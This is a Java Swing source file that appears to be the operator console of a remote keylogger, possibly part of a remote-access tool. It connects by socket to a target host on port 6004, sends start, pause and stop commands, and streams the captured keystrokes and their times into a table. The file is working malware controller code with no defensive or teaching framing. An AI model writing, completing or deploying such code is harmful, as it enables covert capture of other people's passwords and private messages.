package GUI;

import Client.RecvSend;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.Socket;

public class KeyloggerMenu implements RecvSend {
    private JButton startButton = null;
    private JButton stopButton = null;
    private JTable table = null;
    private JScrollPane scrollPane;
    private Socket connect;
    private Thread thread;


    public KeyloggerMenu(String host) {
        JFrame jFrame = new JFrame("Keylogger");
        jFrame.setMinimumSize(new Dimension(300, 400));
        jFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        jFrame.setLayout(new BorderLayout());

        Object[] columnNames = {"Key", "Time"};
        Object[][] data = {};

        TableModel tableModel = new DefaultTableModel(data, columnNames);
        table = new JTable(tableModel);
        table.setEnabled(false);
        table.setFillsViewportHeight(true);

        scrollPane = new JScrollPane(table);
        scrollPane.createHorizontalScrollBar();
        scrollPane.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));

        jFrame.add(scrollPane, BorderLayout.CENTER);

        JPanel buttonPanel = new JPanel();
        buttonPanel.setLayout(new FlowLayout());

        startButton = new JButton("Start");
        startButton.addActionListener(this::actionPerformed);
        startButton.setFocusable(false);
        stopButton = new JButton("Stop");
        stopButton.addActionListener(this::actionPerformed);
        stopButton.setFocusable(false);

        buttonPanel.add(startButton);
        buttonPanel.add(stopButton);

        jFrame.add(buttonPanel, BorderLayout.SOUTH);
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        jFrame.setLocation(screenSize.width / 2 - jFrame.getWidth() / 2, screenSize.height / 2 - jFrame.getHeight() / 2);


        try {
            connect = new Socket(host, 6004);
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "Error: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        jFrame.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                try {
                    RecvSend.sendMess(connect, "Stop");
                    jFrame.dispose();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        jFrame.setVisible(true);

    }

    public void actionPerformed(ActionEvent e) {
        if (e.getSource() == startButton) {
//            Start a new threat and call the keylogger
            RecvSend.sendMess(connect, "Start");
            if (thread == null) {
                thread = new Thread(new UpdateTable());
                thread.start();
            }
        }
        if (e.getSource() == stopButton) {
//            Stop the keylogger
            RecvSend.sendMess(connect, "Pause");
            if (thread != null) {
                thread.interrupt();
            }
        }
    }

    private class UpdateTable implements Runnable{
        @Override
        public void run() {
            while (true) {
                String key = RecvSend.getMess(connect);
                String time = RecvSend.getMess(connect);
                if (key.equals("") || time.equals("")) {
                    continue;
                }
                ((DefaultTableModel) table.getModel()).addRow(new Object[]{key, time});
                scrollPane.getVerticalScrollBar().setValue(scrollPane.getVerticalScrollBar().getMaximum());
            }
        }
    }
}

